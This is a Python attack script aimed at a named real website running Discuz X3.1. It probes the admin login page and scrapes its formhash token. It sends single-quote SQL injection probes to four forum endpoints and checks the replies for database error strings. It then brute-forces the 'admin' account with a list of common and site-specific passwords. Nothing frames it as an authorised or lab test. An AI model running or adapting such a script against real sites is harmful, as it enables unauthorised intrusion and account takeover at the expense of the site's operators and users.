#!/usr/bin/env python3
"""dealabc.com Discuz X3.1 - vuln probes + admin brute"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "http://www.dealabc.com"

def get_opener():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

def fetch(op, url, timeout=10, data=None, headers=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

op = get_opener()
# 1. admin.php - Discuz 后台
code, final, body = fetch(op, HOST + "/admin.php")
print("admin.php: %s size=%d" % (code, len(body)))
has_form = "username" in body.lower() or "admin" in body.lower() or "formhash" in body
print("  login form:", has_form)

# get formhash
m = re.search(r'formhash=([a-f0-9]+)', body)
fh = m.group(1) if m else ""
print("  formhash:", fh)

# 2. Discuz X3.1 SQLi probes
print("\n=== SQLi probes ===")
sqli_tests = [
    "/forum.php?mod=ajax&action=downremoteimg&message=%27",
    "/member.php?mod=logging&action=login&username=%27",
    "/home.php?mod=space&uid=%27",
    "/forum.php?mod=forumdisplay&fid=%27",
]
for p in sqli_tests:
    code, final, body = fetch(op, HOST + p)
    sqlerr = re.findall(r'(SQL|syntax|mysql|error|Warning)', body, re.I)
    print("  %s: %s size=%d sqlerr=%d" % (p[:50], code, len(body), len(sqlerr)))

# 3. admin brute (Discuz 后台 formhash)
print("\n=== admin brute ===")
for pw in ["admin", "admin123", "123456", "admin888", "admin@123", "dealabc", "dealabc123"]:
    op2 = get_opener()
    code, final, body = fetch(op2, HOST + "/admin.php")
    m = re.search(r'formhash=([a-f0-9]+)', body)
    fh = m.group(1) if m else ""
    data = urllib.parse.urlencode({"username": "admin", "password": pw, "formhash": fh})
    code, final, body = fetch(op2, HOST + "/admin.php", data=data,
                              headers={"Referer": HOST + "/admin.php"})
    ok = "退出" in body or "logout" in body.lower() or "admincp" in final.lower() and code == 200
    print("  admin/%s: code=%s ok=%s" % (pw, code, ok))
